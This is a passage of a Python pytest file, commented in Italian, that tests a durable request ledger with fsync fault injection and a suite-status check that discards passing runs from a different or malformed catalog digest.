    path.parent.mkdir()                                            # albero gia' esistente: si prova la sola rinomina
    real_fsync = os.fsync

    def fsync(fd):
        if os.fstat(fd).st_mode & 0o170000 == 0o040000:
            raise OSError("EIO")
        return real_fsync(fd)
    monkeypatch.setattr(D.os, "fsync", fsync)
    with pytest.raises(OSError):
        D.Ledger(path).admit(build())                              # nessun "ammesso" se la durabilita' non e' provata
    with pytest.raises(D.Refused, match="^DUPLICATE_REQUEST$"):
        D.Ledger(path).admit(build())                              # e comunque mai una seconda esecuzione


# Sol su #606 (76665766, VALID_BLOCKERS): un check run vale solo per il catalogo con cui la suite e' stata eseguita.
# Se la definizione cambia su main senza cambiare l'id, il PASS vecchio non certifica la definizione nuova.
_OTHER_CAT = "0" * 64


@pytest.mark.parametrize("runs", [
    [_cr(1, catalog=_OTHER_CAT)],                                               # PASS su un catalogo precedente
    [dict(_cr(1), external_id=None)],                                           # nessun legame col catalogo
    [dict(_cr(1), external_id=CAT_SHA)],                                        # manca il separatore
    [dict(_cr(1), external_id=f"x{CAT_SHA}:k")],                                # prefisso non esatto
])
def test_a_pass_from_another_catalog_never_counts(runs):
    assert D.suite_status("recovery", SHA, runs, CAT_SHA)["state"] == "NOT_REQUESTED"


def test_a_stale_catalog_pass_does_not_mask_the_current_catalog_result():
    runs = [_cr(9, catalog=_OTHER_CAT), _cr(3, conclusion="failure")]           # il PASS vecchio ha l'id piu' alto
    assert D.suite_status("recovery", SHA, runs, CAT_SHA)["state"] == "FAIL"


@pytest.mark.parametrize("bad", ["", "abc", "G" * 64, CAT_SHA.upper(), None])
def test_status_refuses_a_malformed_catalog_digest(bad):
    with pytest.raises(D.Refused, match="^MALFORMED_CATALOG_SHA$"):
        D.suite_status("recovery", SHA, [_cr(1)], bad)


# Sol su #606 (76665766, VALID_BLOCKERS): mkdir(parents=True) senza fsync dei genitori puo' perdere, in un crash
# dell'host, l'albero appena creato insieme al registro, e riammettere una richiesta gia' confermata.
@_NEEDS_FCNTL
def test_every_created_ledger_directory_is_made_durable_in_its_parent(tmp_path, monkeypatch):
    path = tmp_path / "a" / "b" / "admitted.json"
    synced = []
    real_fsync = os.fsync

    def fsync(fd):
        st = os.fstat(fd)
        if st.st_mode & 0o170000 == 0o040000:
            synced.append((st.st_dev, st.st_ino))
        return real_fsync(fd)
    monkeypatch.setattr(D.os, "fsync", fsync)
    D.Ledger(path).admit(build())
    ident = lambda p: (os.stat(p).st_dev, os.stat(p).st_ino)
    assert ident(tmp_path) in synced, synced                    # genitore di "a"
    assert ident(tmp_path / "a") in synced, synced              # genitore di "b"
    assert ident(tmp_path / "a" / "b") in synced, synced        # directory del registro (rinomina)


@_NEEDS_FCNTL
def test_a_failed_fsync_of_a_new_parent_directory_admits_nothing(tmp_path, monkeypatch):
    path = tmp_path / "a" / "admitted.json"
    real_fsync = os.fsync

    def fsync(fd):
        if os.fstat(fd).st_mode & 0o170000 == 0o040000:
            raise OSError("EIO")
        return real_fsync(fd)
    monkeypatch.setattr(D.os, "fsync", fsync)
    with pytest.raises(OSError):
        D.Ledger(path).admit(build())
    assert not path.exists()                                     # nessuna ammissione senza albero durevole
